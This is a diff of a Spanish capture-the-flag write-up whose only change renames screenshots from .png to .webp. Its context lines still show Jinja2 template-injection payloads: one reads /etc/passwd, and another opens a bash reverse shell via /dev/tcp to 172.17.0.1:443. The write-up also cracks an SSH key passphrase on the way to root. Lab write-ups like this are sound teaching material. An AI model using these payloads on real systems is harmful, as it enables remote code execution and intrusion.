@@ -4,7 +4,7 @@ Propiedades:
 - Nivel: Easy
 - Tags: #ssti #jinja2 #ssh-key-cracking #password-cracking
 
-![](assets/Pasted%20image%2020251110164053.png)
+![](assets/Pasted%20image%2020251110164053.webp)
 
 ## Reconocimiento
 
@@ -84,11 +84,11 @@ http://172.17.0.2:8089/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.
 
 La aplicacion tiene solo un input:
 
-![](assets/Pasted%20image%2020251110165559.png)
+![](assets/Pasted%20image%2020251110165559.webp)
 
 Probando la aplicación noto que el input del usuario se refleja en la página. El parámetro `?user=` también se refleja en la pagina.
 
-![](assets/Pasted%20image%2020251110165824.png)
+![](assets/Pasted%20image%2020251110165824.webp)
 
 Sabiendo que la aplicación corre en Python y que el input del usuario se refleja dinámicamente, sospecho que podría estar utilizando un motor de plantillas como **Jinja2**, lo cual podría ser vulnerable a **SSTI (Server-Side Template Injection)**.
 
@@ -104,7 +104,7 @@ En el input coloco:
 {{7*7}}
 ```
 
-![](assets/Pasted%20image%2020251110170230.png)
+![](assets/Pasted%20image%2020251110170230.webp)
 
 - La aplicación evalúa la expresión y devuelve `49`, confirmando la vulnerabilidad SSTI.
 
@@ -118,7 +118,7 @@ Ahora que se que la web es vulnerable a SSTI puedo buscar payloads para Jinja2 q
 > {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
-![](assets/Pasted%20image%2020251110170620.png)
+![](assets/Pasted%20image%2020251110170620.webp)
 
 - El `/etc/passwd` muestra que existe un usuario llamado `verde`
 
@@ -132,7 +132,7 @@ SSTI tambien me va a permitr ejecutar comandos, por lo cual voy a buscar algun p
 > {{ self.__init__.__globals__.__builtins__.__import__('subprocess').Popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"', shell=True) }}
 ```
 
-![](assets/Pasted%20image%2020251110171843.png)
+![](assets/Pasted%20image%2020251110171843.webp)
 
 Primero me tengo quee poner en escucha en mi máquina atacante.
 
@@ -199,7 +199,7 @@ Puedo crackear la contraseña utilizando `ssh2john` para extraer el hash crackea
 root-key:honda1
 ```
 
-![](assets/Pasted%20image%2020251110175319.png)
+![](assets/Pasted%20image%2020251110175319.webp)
 
 - Contraseña encontrada: `honda1`
 
@@ -214,6 +214,6 @@ root@d56c80ae05a3:~# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-![](assets/Pasted%20image%2020251110175431.png)
+![](assets/Pasted%20image%2020251110175431.webp)
 
 ***PWNED***
